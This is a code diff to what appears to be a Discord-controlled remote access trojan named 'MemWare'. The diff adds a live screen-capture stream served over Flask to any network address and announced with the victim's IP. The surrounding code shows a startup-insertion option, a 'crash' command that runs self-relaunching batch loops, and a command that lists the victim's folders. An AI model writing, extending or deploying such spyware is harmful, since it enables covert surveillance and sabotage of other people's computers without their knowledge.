@@ -9,11 +9,12 @@ import zipfile
 import json
 import socket
 import shutil
+from threading import Thread
 
 ############################################################## CONFIG
-defaultStartup = True # If (by default) you want this to insert to startup
+defaultStartup = False # If (by default) you want this to insert to startup
 notificationChannel = int("notification-channel-here (INTEGER, REMOVE QUOTES)") # Channel to send the notification that this machine is online to (Channel ID, keep as integer)
-botToken = "Discord-Bot-Token-Here" # Put your discord bot's token here
+botToken = "bot-token-here" # Put your discord bot's token here
 
 ############################################################## CONFIG
 
@@ -432,6 +433,87 @@ def getdata(dataname):
     except Exception as e:
         return (False, e)
  
+def startstream():
+    import cv2
+    import mss
+    import numpy
+    import ctypes
+
+    from flask import render_template, Flask, Response
+
+    import threading
+    import time
+
+    class Camera(object): #https://stackoverflow.com/questions/65919614/how-to-stream-desktop-with-flask
+        thread = None
+        frame = None
+        last_access = 0
+
+        def __init__(self):
+            if Camera.thread is None:
+                Camera.last_access = time.time()
+                Camera.thread = threading.Thread(target=self._thread)
+                Camera.thread.start()
+
+                while self.get_frame() is None:
+                    time.sleep(0)
+
+        def get_frame(self):
+            '''Get the current frame.'''
+            Camera.last_access = time.time()
+
+            return Camera.frame
+
+        @staticmethod
+        def frames():
+            '''Create a new frame every 2 seconds.'''
+            user32 = ctypes.windll.user32
+            monitor = {
+                'top': 0,
+                'left': 0,
+                'width': 1990, #ADJUST YOUR SCREEN SIZE HERE (width)
+                'height': 1080 #ADJUST YOUR SCREEN SIZE HERE (height)
+            }
+            with mss.mss() as sct:
+                while True:
+                    time.sleep(0.5)
+                    raw = sct.grab(monitor)
+                    # Use numpy and opencv to convert the data to JPEG. 
+                    img = cv2.imencode('.jpg', numpy.array(raw))[1].tobytes()
+                    yield(img)
+
+        @classmethod
+        def _thread(cls):
+            '''As long as there is a connection and the thread is running, reassign the current frame.'''
+            print('Starting camera thread.')
+            frames_iter = cls.frames()
+            for frame in frames_iter:
+                Camera.frame = frame
+                if time.time() - cls.last_access > 10:
+                    frames_iter.close()
+                    print('Stopping camera thread due to inactivity.')
+                    break
+            cls.thread = None
+
+    app = Flask(__name__)
+
+    @app.route('/')
+    def index():
+        return render_template('index.html')
+
+    def gen(camera):
+        while True:
+            frame = camera.get_frame()
+            yield (b'--frame\r\n'
+                b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+
+    @app.route('/MemWare/stream')
+    def video_feed():
+        return Response(gen(Camera()),
+                        mimetype='multipart/x-mixed-replace; boundary=frame')
+
+    app.run(host='0.0.0.0', debug=True, use_reloader=False)
+
 prefix = getprefix()
 
 ########################## discord shit
@@ -460,7 +542,7 @@ async def crash(ctx):
         :a
         set /A variable = 1
         echo %variable%
-        set /A variable=%variable%+13
+        set /A variable=%variable%*99
         echo %variable%
         start %0
         goto a
@@ -608,5 +690,21 @@ async def explorer(ctx, *, path: str="C:/"):
         await ctx.send(os.listdir(path))
     except PermissionError:
         await ctx.send("We don't have permission to that folder")
-        
+
+@bot.command(brief="Web stream config")
+async def stream(ctx, var=None):
+    if var is None:
+        await ctx.send("Welcome to the stream config:\n\n To start the stream, use: (IP)+stream start")
+        return
+    if var.lower() == "start":
+        try:
+            streamthread = Thread(target=startstream, args=())
+            streamthread.start()
+            await ctx.send(f"The stream should now be online on: http://{getip()}:5000/MemWare/stream")
+        except RuntimeError:
+            await ctx.send(f"The stream is already running!\n(http://{getip()}:5000/MemWare/stream)")
+        except Exception as e:
+            await ctx.send(f"Something went wrong!\n({e})")
+
+
 bot.run(botToken)
